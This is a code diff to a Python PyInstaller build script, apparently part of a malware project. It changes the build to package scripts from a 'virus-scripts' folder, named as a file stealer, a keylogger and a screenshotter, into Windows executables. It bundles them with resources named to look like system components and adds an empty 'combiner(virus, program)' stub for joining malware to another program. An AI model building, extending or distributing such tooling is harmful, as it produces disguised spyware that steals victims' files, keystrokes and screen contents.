@@ -7,11 +7,11 @@ import PyInstaller.__main__
 # If you don't need any data bundled into the EXE, just put a string containing a path to the script in exes.
 # Put each EXE array/path string in the exes array.
 
-starter = [['starter.py', 'starter'], ['resources\\WindowsGeneralManager.xml', 'data'], ['resources\\WinSE.cmd', 'data']]
+starter = [['starter.py', 'starter'], ['resources\\WindowsGeneralManager.xml', 'data'], ['resources\\WinSE.cmd', 'data'], ['resources\\boot_animation.exe', 'data']]
 boot_animation = [['virus-scripts\\boot_animation.py', 'boot_animation'],
                   ['resources\\Windows-Boot-Animation-Frames', 'data\\frames']]
-#exes = [starter, boot_animation]
-exes = [boot_animation]
+#exes = [boot_animation]
+exes = [starter, 'virus-scripts\\file_stealer.py', 'virus-scripts\\keylogger.py', 'virus-scripts\\screenshotter.py']
 
 def prepare_datas(exe):
     added_files = ''
@@ -62,11 +62,11 @@ def make_exe():
         'instructions.spec'
     ])
 
+def combiner(virus, program):
+    pass
+
 for exe in exes:
     added_files = prepare_datas(exe)
     make_spec_file(exe, added_files)
     make_exe()
     os.remove('instructions.spec')
-
-
-
